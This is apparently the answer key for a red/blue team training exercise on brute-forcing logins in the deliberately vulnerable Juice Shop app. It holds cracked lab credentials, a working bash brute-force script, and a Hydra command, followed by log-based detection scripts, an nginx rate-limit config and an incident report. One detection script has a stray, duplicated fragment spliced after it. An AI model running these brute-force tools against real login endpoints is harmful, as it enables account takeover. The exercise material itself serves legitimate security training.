# Exercise 02 Answers: Brute Force & Rate Limiting

## 🔴 Red Team Answers

### Working Credentials Found

| Email | Password | Notes |
|-------|----------|-------|
| admin@juice-sh.op | admin123 | Default admin |
| jim@juice-sh.op | ncc-1701 | Star Trek reference |
| bender@juice-sh.op | OhG0dPlease1444ert! | Futurama reference |
| mc.safesearch@juice-sh.op | Mr. N00dles | |

### Complete Brute Force Script

```bash
#!/bin/bash
# brute_force_complete.sh
TARGET="http://<VPS_IP>:8080"

# Known users
USERS=("admin@juice-sh.op" "jim@juice-sh.op" "bender@juice-sh.op")

# Common passwords for Juice Shop
PASSWORDS=(
    "admin" "admin123" "password" "123456"
    "ncc-1701" "ncc-1701-d"  # Star Trek for Jim
    "bender" "rodriguez"     # Futurama for Bender
)

for email in "${USERS[@]}"; do
    echo "=== Attacking: $email ==="
    
    for password in "${PASSWORDS[@]}"; do
        RESPONSE=$(curl -s -X POST "$TARGET/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$email\",\"password\":\"$password\"}")
        
        if echo "$RESPONSE" | grep -q "token"; then
            echo "✓ SUCCESS: $email : $password"
            break
        fi
    done
done
```

### Hydra Command (Alternative)

```bash
hydra -L users.txt -P passwords.txt \
    <VPS_IP> http-post-form \
    "/rest/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid" \
    -H "Content-Type: application/json"
```

---

## 🔵 Blue Team Answers

### SSH Access

```bash
# Connect to Blue Team server
ssh blueteam@<VPS_IP> -p 2222
# Password: defend123
```

### Detection Commands (on Blue Team Server)

#### Real-Time Monitoring
```bash
# Watch all login attempts
tail -f /var/log/nginx/access.log | grep "login"

# Count failed logins
grep "login" /var/log/nginx/access.log | grep -c '" 401 '

# Or use helper script
~/scripts/detect-bruteforce.sh
```

#### Find Attacker
```bash
# Most active IPs on login endpoint
grep "login" /var/log/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn | head -5

# Or use helper script
~/scripts/show-attackers.sh
```

#### Kibana Queries
```
# Failed logins
message: *login* AND response:401

# Success after many failures (suspicious)
message: *login* AND response:200
```

### Document Attacker for Blocking

```bash
# Find and record attacker IP
ATTACKER=$(grep "login" /var/log/nginx/access.log | grep '" 401 ' | \
    awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')

echo "Attacker IP to report: $ATTACKER"
echo "$ATTACKER" >> ~/blocked_ips.txt
```

### Complete Detection Script

```bash
#!/bin/bash
# brute_force_detector.sh
THRESHOLD=10

while true; do
    echo "=== Brute Force Check $(date) ==="
    
    # Get IPs with failed logins
    grep "login" /var/log/nginx/access.log | grep '" 401 ' | \
        awk '{print $1}' | sort | uniq -c | sort -rn | head -5
    
    FAILED=$(grep "login" /var/log/nginx/access.log | grep -c '" 401 ')
    
    if [ "$FAILED" -gt "$THRESHOLD" ]; then
        echo "⚠️  ALERT: $FAILED failed login attempts detected!"
    fi
    
    sleep 10
done
```
            if [ "$count" -gt "$MAX_ATTEMPTS" ]; then
                echo "⚠️  ALERT: $ip has $count failed attempts"
                # Block inside nginx container
                docker exec nginx-proxy sh -c "echo 'deny $ip;' >> /etc/nginx/blocked.conf" 2>/dev/null
            fi
        done
    
    sleep 10
done
```

### Rate Limiting Configuration

```nginx
# /etc/nginx/conf.d/rate_limit.conf

# Define rate limit zone
limit_req_zone $binary_remote_addr zone=login_limit:10m rate=5r/s;

# Apply to login endpoint
server {
    listen 80;
    
    location /rest/user/login {
        # Allow 5 requests/second, burst of 10
        limit_req zone=login_limit burst=10 nodelay;
        limit_req_status 429;
        
        proxy_pass http://juice-shop:3000;
    }
    
    location / {
        proxy_pass http://juice-shop:3000;
    }
}
```

### Sample Incident Report

```
BRUTE FORCE INCIDENT REPORT
===========================

Detection Time: 15:22
Attacker IP: 192.168.1.100
Attack Duration: 8 minutes

Attack Statistics:
- Total login attempts: 127
- Failed attempts: 124
- Successful logins: 3
- Accounts targeted: 5

Compromised Accounts:
1. admin@juice-sh.op
2. jim@juice-sh.op  
3. bender@juice-sh.op

Response Timeline:
- 15:22 - High volume of 401s detected
- 15:25 - Attack pattern confirmed (brute force)
- 15:28 - IP blocked via iptables
- 15:30 - Attack stopped

Immediate Actions:
- Force password reset for compromised accounts
- Check for unauthorized activity during attack window
- Review account permissions

Recommendations:
1. Implement account lockout (5 failed = 15 min lock)
2. Add CAPTCHA after 3 failed attempts
3. Implement 2FA for all accounts
4. Use rate limiting (5 requests/second max)
5. Add login anomaly alerting
```

---

## 🎓 Learning Points

### Attack Patterns to Detect

| Pattern | Meaning | Threshold |
|---------|---------|-----------|
| Many 401s, same IP | Brute force | >10/minute |
| Many 401s, rotating IPs | Distributed attack | >50 total |
| Different users, same password | Password spray | >5 users |
| Rapid requests (<100ms apart) | Automated tool | >10/second |

### Effective Defenses

1. **Account Lockout**
   - Lock after 5 failed attempts
   - Progressive delays (1min, 5min, 15min, 1hr)

2. **Rate Limiting**
   - 5 requests/second per IP
   - Burst allowance of 10

3. **CAPTCHA**
   - Show after 3 failed attempts
   - Required for new IPs

4. **Multi-Factor Authentication**
   - TOTP (Time-based One-Time Password)
   - Push notifications
   - Hardware keys

### Why Plain Passwords Fail

```
admin123  → Cracked in <1 second (common list)
ncc-1701  → Cracked in ~5 minutes (Star Trek list)
Complex   → May take hours/days (still risky)
```

**Solution:** Use password policies + rate limiting + 2FA
